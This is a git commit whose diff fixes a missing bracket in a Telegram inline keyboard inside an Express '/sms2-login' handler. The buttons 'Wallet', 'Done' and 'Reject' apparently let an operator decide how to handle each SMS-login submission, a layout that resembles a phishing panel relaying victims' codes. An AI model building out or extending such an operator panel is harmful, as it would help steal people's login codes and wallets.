dcaedafd83de1b849761a4e7a354e93699c38abf
gratous100 <122572602+gratous100@users.noreply.github.com>
2026-09-13 21:44:16 +0100

    Fix formatting of inline keyboard options

--- server.js
+++ server.js
@@ -1652,7 +1652,7 @@ app.post("/sms2-login", async (req, res) => {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
-          [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` },
+          [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }],
           [{ text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` }],
           [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }],
           [
